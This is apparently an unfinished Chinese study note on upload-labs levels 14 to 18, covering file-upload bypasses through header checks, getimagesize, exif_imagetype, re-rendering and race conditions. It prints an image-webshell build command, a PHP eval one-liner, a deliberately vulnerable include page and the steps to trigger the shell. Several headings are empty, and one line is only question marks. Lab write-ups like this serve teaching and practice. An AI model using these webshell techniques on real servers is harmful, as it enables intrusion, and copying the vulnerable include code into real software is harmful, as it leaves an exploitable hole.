![](https://gitee.com/YatJay/image/raw/master/img/202202241038576.png)

# 涉及知识

## 图片一句话制作方法

图片写入后门代码命令：`copy 1.png /b + shell.php /a webshell.jpg`

其中`1.png`是图片文件，`shell.php`是PHP一句话或脚本文件，该命令亦相当于使用文本编辑器打开图片以后，在图片文本的末尾添加PHP脚本

## 文件头检测



## 图像文件信息判断



## 逻辑安全——二次渲染



## 逻辑安全——条件竞争



## 目录命名——x.php/.



## 脚本换算漏洞-CVE-2015-2348



## 数组接受——目录命名



# 演示案例

## Uploadlabs-pass13-20 关卡测试

### Pass-14(文件头检测，图片马利用文件包含漏洞)==涉及文件包含漏洞利用==

```php
//此函数通过检测文件头返回文件后缀名，只允许图片文件上传
function getReailFileType($filename){
    $file = fopen($filename, "rb");
    $bin = fread($file, 2); //只读2字节
    fclose($file);
    $strInfo = @unpack("C2chars", $bin);    
    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    
    $fileType = '';    
    switch($typeCode){      
        case 255216:            
            $fileType = 'jpg';
            break;
        case 13780:            
            $fileType = 'png';
            break;        
        case 7173:            
            $fileType = 'gif';
            break;
        default:            
            $fileType = 'unknown';
        }    
        return $fileType;
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_type = getReailFileType($temp_file);//通过文件头获取文件类型

    if($file_type == 'unknown'){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}

```

本关卡通过检测上传文件的文件头来判断文件类型，只允许图片文件上传，因此可以**制作图片一句话来上传，之后再利用提示中的文件包含漏洞进行操作。**

制作图片一句话

![](https://gitee.com/YatJay/image/raw/master/img/202202241135202.png)

上传图片一句话成功

![](https://gitee.com/YatJay/image/raw/master/img/202202241136072.png)

查看提示中的文件包含漏洞情况

```php
 <?php
/*
本页面存在文件包含漏洞，用于测试图片马是否能正常运行！
*/
header("Content-Type:text/html;charset=utf-8");
$file = $_GET['file'];
if(isset($file)){
    include $file;
}else{
    show_source(__file__);
}
?> 
```

上述代码说明，只要使用GET方法提交名为file的参数，那么就会将该参数值包含，并作为PHP脚本来进行解析，因此我们使用GET方法提交参数值为上传文件的路径，文件路径可以右键网页中显示的图片来获得

![](https://gitee.com/YatJay/image/raw/master/img/202202241542729.png)

GET提交参数即`http://localhost/PenTest/uploadlabs/include.php?file=upload/9820220224033548.jpg`，可见该图片文件会被当做PHP脚本来解析

![](https://gitee.com/YatJay/image/raw/master/img/202202241535998.png)

我们写的一句话内容是`<?php @eval($_POST['shell']);?>`，所以使用POST方法提交名为shell的参数来执行

POST提交`shell=phpinfo();`可以成功执行如下，或者也可使用中国菜刀连接webshell

<img src="https://gitee.com/YatJay/image/raw/master/img/202202241538493.png" style="zoom:80%;" />



### Pass-15(突破getimagesize)

#### getimagesize()函数

getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。

**函数的机制决定了其只接收图像文件并获取图像信息，相当于限制了文件类型。**

因此如果只能上传图像，就只能配合其他漏洞如文件解析、文件包含来对脚本加以利用，否则就无从利用图像来触发脚本语句。

```php
//判断是否为图像文件——只允许上传图像文件
function isImage($filename){
    $types = '.jpeg|.png|.gif';
    if(file_exists($filename)){
        $info = getimagesize($filename);
        $ext = image_type_to_extension($info[2]);
        if(stripos($types,$ext)>=0){
            return $ext;
        }else{
            return false;
        }
    }else{
        return false;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

和Pass-14一样，制作图片木马后上传并使用GET及POST方法提交相关参数，可见可以利用文件包含执行写在图片文件末尾的PHP脚本

![](https://gitee.com/YatJay/image/raw/master/img/202202250854443.png)



### Pass-16(突破exif-imagetype)

#### exif-imagetype

exif_imagetype(string `$filename`)                     返回值为int

**exif_imagetype()** 读取一个图像的第一个字节并检查其签名。

如果发现了恰当的签名则返回一个对应的常量，否则返回 **`false`**。返回值和 [getimagesize()](https://www.php.net/manual/zh/function.getimagesize.php) 返回的数组中的索引 2 的值是一样的，但本函数快得多。

定义有以下常量，并代表了 **exif_imagetype()** 可能的返回值：

| 值   | 常量                                         |
| :--- | :------------------------------------------- |
| 1    | **`IMAGETYPE_GIF`**                          |
| 2    | **`IMAGETYPE_JPEG`**                         |
| 3    | **`IMAGETYPE_PNG`**                          |
| 4    | **`IMAGETYPE_SWF`**                          |
| 5    | **`IMAGETYPE_PSD`**                          |
| 6    | **`IMAGETYPE_BMP`**                          |
| 7    | **`IMAGETYPE_TIFF_II`**（Intel 字节顺序）    |
| 8    | **`IMAGETYPE_TIFF_MM`**（Motorola 字节顺序） |
| 9    | **`IMAGETYPE_JPC`**                          |
| 10   | **`IMAGETYPE_JP2`**                          |
| 11   | **`IMAGETYPE_JPX`**                          |
| 12   | **`IMAGETYPE_JB2`**                          |
| 13   | **`IMAGETYPE_SWC`**                          |
| 14   | **`IMAGETYPE_IFF`**                          |
| 15   | **`IMAGETYPE_WBMP`**                         |
| 16   | **`IMAGETYPE_XBM`**                          |

开启开启php_exif模块如下

<img src="https://gitee.com/YatJay/image/raw/master/img/202202251513379.png" style="zoom:80%;" />

```php
function isImage($filename){
    //需要开启php_exif模块
    $image_type = exif_imagetype($filename);
    switch ($image_type) {
        case IMAGETYPE_GIF:
            return "gif";
            break;
        case IMAGETYPE_JPEG:
            return "jpg";
            break;
        case IMAGETYPE_PNG:
            return "png";
            break;    
        default:
            return false;
            break;
    }
}

$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $res = isImage($temp_file);
    if(!$res){
        $msg = "文件未知，上传失败！";
    }else{
        $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res;
        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传出错！";
        }
    }
}
```

上述代码说明本关卡使用**exif-imagetype()**函数来判断文件类型，只允许上传图片文件(png、jpg、gif)

和Pass-14一样，制作图片木马后上传并使用GET及POST方法提交相关参数，可见可以利用文件包含执行写在图片文件末尾的PHP脚本

上传成功

![](https://gitee.com/YatJay/image/raw/master/img/202202251515444.png)

提交参数执行脚本成功

![](https://gitee.com/YatJay/image/raw/master/img/202202251517178.png)

### Pass-17(==突破验证函数+二次渲染==)

#### 详细参考以下文章

[upload-labs之pass 16详细分析](https://xz.aliyun.com/t/2657#toc-0)(Pass-17是原Pass-16关卡)

[论文件上传绕过的各种姿势（二）](https://xz.aliyun.com/t/6693)

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])){
    // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径
    $filename = $_FILES['upload_file']['name'];
    $filetype = $_FILES['upload_file']['type'];
    $tmpname = $_FILES['upload_file']['tmp_name'];

    $target_path=UPLOAD_PATH.'/'.basename($filename);

    // 获得上传文件的扩展名
    $fileext= substr(strrchr($filename,"."),1);

    //判断文件后缀与类型，合法才进行上传操作
    if(($fileext == "jpg") && ($filetype=="image/jpeg")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromjpeg($target_path);

            if($im == false){
                $msg = "该文件不是jpg格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".jpg";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagejpeg($im,$img_path);
                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "png") && ($filetype=="image/png")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefrompng($target_path);

            if($im == false){
                $msg = "该文件不是png格式的图片！";
                @unlink($target_path);
            }else{
                 //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".png";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagepng($im,$img_path);

                @unlink($target_path);
                $is_upload = true;               
            }
        } else {
            $msg = "上传出错！";
        }

    }else if(($fileext == "gif") && ($filetype=="image/gif")){
        if(move_uploaded_file($tmpname,$target_path)){
            //使用上传的图片生成新的图片
            $im = imagecreatefromgif($target_path);
            if($im == false){
                $msg = "该文件不是gif格式的图片！";
                @unlink($target_path);
            }else{
                //给新图片指定文件名
                srand(time());
                $newfilename = strval(rand()).".gif";
                //显示二次渲染后的图片（使用用户上传图片生成的新图片）
                $img_path = UPLOAD_PATH.'/'.$newfilename;
                imagegif($im,$img_path);

                @unlink($target_path);
                $is_upload = true;
            }
        } else {
            $msg = "上传出错！";
        }
    }else{
        $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！";
    }
}
```

上述代码判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后还做了一次二次渲染，改变了图片中的部分内容。

突破思路：将一个正常显示的图片，上传到服务器。将图片被渲染后与原始图片对比，寻找仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。

这里我们将PHP一句话插入到数据包中文件开始部分

==??????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????==



因此Pass-14、15、16、17都是使用函数验证，只允许上传图片文件，只需上传图片马，再利用文件包含漏洞就能触发脚本语句。

### Pass-18(二次渲染)

#### 二次渲染

普通的文件上传，在上传后就把文件保存到服务器，二次渲染则有所不同。

二次渲染分两步

1. 先把文件上传服务器，
2. 服务器将这个文件进行保存或删除（上传的时候下面有保存和上传的按钮）

场景：上传头像时如果尺寸大小不合规范，会要求用户截取一定区域的图片之后再点击保存头像

#### 二次渲染的绕过

二次渲染的绕过用gif文件比较好绕，因为格式要求不是很严格

png和jpg文件要求格式很严格

PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了4个标准数据块，每个PNG文件都必须包含它们，PNG读写软件也都必须要支持这些数据块。

#### unlink()

- `unlink()` 函数是用来删除文件的

#### 条件竞争

**参考文章**：[浅析条件竞争漏洞](http://www.atkx.top/2021/05/23/%E6%B5%85%E6%9E%90%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E/)

条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。

- 首先在burp中不断发送上传webshell的数据包：
- 然后不断在浏览器中访问，发现通过竞争可以访问到：

本关考察的是条件竞争，查看代码：

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){  //第一次保存：注意这里还没有判断文件类型，就把文件保存到了$upload_file路径
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);//第二次保存：这里验证完后缀名，再重命名保存
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

```

第一次保存：还没有判断文件类型，就把文件保存到了$upload_file路径

第二次保存：这里验证完后缀名，再重命名保存

在执行完move_uploaded_file之后，执行rename()、unlink()之前，此时这个php文件是已经保存到了web服务器上的，并且我们能够访问。

如果上传的图片的功能是写一句话到该图片文件，这样我们**在删除之前访问该文件**，就会生成一个一句话木马，就可以得到webshell。 所以我们使用多线程并发的不断访问上传的文件，服务器中的函数执行都是需要时间的，如果我上传上去的文件在没被删除的时候，一旦成功访问到了上传的文件，那么它就会向服务器写入shell。

一般而言，我们是上传了文件，但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和rename()、unlink()，以及删除文件的函数进行竞争。文件被访问时，不可以删除。这就如同在编辑文件时，点击删除是不能成功执行的，访问文件时也类似。

#### 绕过操作

本关卡没有文件包含漏洞，就不能直接上传图片马，要利用条件竞争来触发脚本

文件一上传到服务器上，就对其进行访问，通过条件竞争在rename()、unlink()执行之前就访问

上传时进行抓包，使用burp的intruder模块，向服务器不断发包，浏览器不断进行访问，争取条件竞争的成功





### Pass-19(条件竞争)



### Pass-20(文件夹-目录)



### Pass-21(数组接受+目录命名)



## CVE-2017-12615-上传-Tomcat



## 中间件解析漏洞+配合文件上传测试



# 涉及资源

https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html

web中间件常见漏洞总结[web中间件常见漏洞总结.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/22078880/1629340384724-c9581792-6045-4607-9b76-298c9277a7ab.pdf)
